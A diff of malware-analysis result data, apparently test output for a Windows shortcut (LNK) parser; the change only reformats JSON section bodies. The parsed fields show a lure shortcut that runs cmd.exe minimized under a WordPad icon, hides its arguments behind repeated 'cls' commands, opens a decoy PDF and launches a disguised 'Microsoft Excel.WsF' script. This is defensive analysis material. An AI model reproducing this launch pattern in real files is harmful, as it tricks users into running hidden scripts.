@@ -5,7 +5,22 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [2.4131609411447057, 2.3525345023777002, 2.629844970157394, 3.1033590827980992, 3.641808571859088]}}",
+        "body": {
+          "data": {
+            "domain": [
+              0,
+              8
+            ],
+            "values": [
+              2.4131609411447057,
+              2.3525345023777002,
+              2.629844970157394,
+              3.1033590827980992,
+              3.641808571859088
+            ]
+          },
+          "type": "colormap"
+        },
         "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
@@ -18,7 +33,16 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"flags\": \"IDList, CommandArgs, IconFile, Unicode\", \"file_attributes\": \"(none)\", \"icon_index\": 2, \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"cmd.exe\", \"command_line_arguments\": \"/c cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&start 2.pdf&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&start Microsoft\\\" \\\"Excel.WsF&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&exit\", \"icon_file_name\": \"\\\"%ProgramFiles%\\\\Windows NT\\\\Accessories\\\\WORDPAD.EXE\\\"\"}",
+        "body": {
+          "command_line_arguments": "/c cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&start 2.pdf&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&start Microsoft\" \"Excel.WsF&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&exit",
+          "file_attributes": "(none)",
+          "flags": "IDList, CommandArgs, IconFile, Unicode",
+          "hot_key": "(none)",
+          "icon_file_name": "\"%ProgramFiles%\\Windows NT\\Accessories\\WORDPAD.EXE\"",
+          "icon_index": 2,
+          "run_window": "Show Minimized No Activate",
+          "target_file_dosname": "cmd.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -60,7 +84,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"icon_location\": \"\\\"%ProgramFiles%\\\\Windows NT\\\\Accessories\\\\WORDPAD.EXE\\\"\"}",
+        "body": {
+          "icon_location": "\"%ProgramFiles%\\Windows NT\\Accessories\\WORDPAD.EXE\""
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -80,7 +106,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"target_file_dosname\": \"Windows\\\\system32\\\\cmd.exe\"}",
+        "body": {
+          "target_file_dosname": "Windows\\system32\\cmd.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
